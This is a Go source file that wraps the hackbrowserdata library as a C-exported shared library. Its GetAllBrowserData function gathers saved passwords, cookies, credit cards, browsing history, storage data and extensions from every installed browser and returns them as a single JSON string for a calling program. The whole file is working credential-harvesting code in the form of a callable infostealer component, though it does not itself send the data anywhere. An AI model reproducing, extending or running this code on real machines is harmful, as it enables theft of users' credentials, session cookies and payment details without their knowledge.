package main

/*
#include <stdlib.h>
*/
import "C"
import (
	"encoding/json"
	"fmt"
	"unsafe"

	"github.com/moond4rk/hackbrowserdata/browser"
	"github.com/moond4rk/hackbrowserdata/browserdata/bookmark"
	"github.com/moond4rk/hackbrowserdata/browserdata/cookie"
	"github.com/moond4rk/hackbrowserdata/browserdata/creditcard"
	"github.com/moond4rk/hackbrowserdata/browserdata/download"
	"github.com/moond4rk/hackbrowserdata/browserdata/extension"
	"github.com/moond4rk/hackbrowserdata/browserdata/history"
	"github.com/moond4rk/hackbrowserdata/browserdata/localstorage"
	"github.com/moond4rk/hackbrowserdata/browserdata/password"
	"github.com/moond4rk/hackbrowserdata/browserdata/sessionstorage"
	"github.com/moond4rk/hackbrowserdata/log"
)

//export GetAllBrowserData
func GetAllBrowserData() *C.char {
	log.SetVerbose()

	browsers, err := browser.PickBrowsers("all", "")
	if err != nil {
		log.Error(err)
		return C.CString(`{"error": "no browsers found"}`)
	}

	allData := make(map[string]map[string]interface{})

	for _, b := range browsers {
		data, err := b.BrowsingData(true)
		if err != nil {
			log.Errorf("get %s browsing data failed, err: %s", b.Name(), err)
			continue
		}

		browserData := make(map[string]interface{})
		for _, extractor := range data.GetExtractors() {
			switch e := extractor.(type) {
			case *bookmark.ChromiumBookmark:
				browserData[e.Name()] = *e
			case *bookmark.FirefoxBookmark:
				browserData[e.Name()] = *e
			case *cookie.ChromiumCookie:
				browserData[e.Name()] = *e
			case *cookie.FirefoxCookie:
				browserData[e.Name()] = *e
			case *creditcard.ChromiumCreditCard:
				browserData[e.Name()] = *e
			case *creditcard.YandexCreditCard:
				browserData[e.Name()] = *e
			case *download.ChromiumDownload:
				browserData[e.Name()] = *e
			case *download.FirefoxDownload:
				browserData[e.Name()] = *e
			case *history.ChromiumHistory:
				browserData[e.Name()] = *e
			case *history.FirefoxHistory:
				browserData[e.Name()] = *e
			case *password.ChromiumPassword:
				browserData[e.Name()] = *e
			case *password.FirefoxPassword:
				browserData[e.Name()] = *e
			case *password.YandexPassword:
				browserData[e.Name()] = *e
			case *localstorage.ChromiumLocalStorage:
				browserData[e.Name()] = *e
			case *localstorage.FirefoxLocalStorage:
				browserData[e.Name()] = *e
			case *sessionstorage.ChromiumSessionStorage:
				browserData[e.Name()] = *e
			case *sessionstorage.FirefoxSessionStorage:
				browserData[e.Name()] = *e
			case *extension.ChromiumExtension:
				browserData[e.Name()] = *e
			case *extension.FirefoxExtension:
				browserData[e.Name()] = *e
			}
		}
		allData[b.Name()] = browserData
	}

	jsonData, err := json.Marshal(allData)
	if err != nil {
		log.Error(err)
		errorMsg := fmt.Sprintf(`{"error": "failed to marshal data: %s"}`, err.Error())
		return C.CString(errorMsg)
	}

	return C.CString(string(jsonData))
}

func main() {}

//export FreeString
func FreeString(s *C.char) {
	C.free(unsafe.Pointer(s))
}
